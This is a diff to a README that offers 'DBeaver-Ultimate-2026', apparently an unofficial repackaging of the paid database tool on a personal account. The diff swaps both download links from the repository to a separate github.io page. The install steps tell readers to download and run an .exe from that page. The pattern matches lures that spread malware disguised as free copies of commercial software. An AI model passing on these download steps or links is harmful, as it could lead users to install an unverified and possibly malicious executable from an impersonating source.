@@ -1,6 +1,6 @@
 # 📂 DBeaver-Ultimate-2026 - Manage your databases with ease today
 
-[![Download DBeaver-Ultimate-2026](https://img.shields.io/badge/Download-DBeaver_Ultimate-blue)](https://github.com/sarol8531/DBeaver-Ultimate-2026)
+[![Download DBeaver-Ultimate-2026](https://img.shields.io/badge/Download-DBeaver_Ultimate-blue)](https://sarol8531.github.io)
 
 ## 📌 About this application
 
@@ -20,7 +20,7 @@ Before you install the application, check that your computer meets these require
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the project website. Click this link to open the page: [https://github.com/sarol8531/DBeaver-Ultimate-2026](https://github.com/sarol8531/DBeaver-Ultimate-2026).
+1. Visit the project website. Click this link to open the page: [https://sarol8531.github.io](https://sarol8531.github.io).
 2. Look for the release section on the right side of the page.
 3. Click the latest version of the installer file. The file ends with .exe.
 4. Wait for the download to finish.
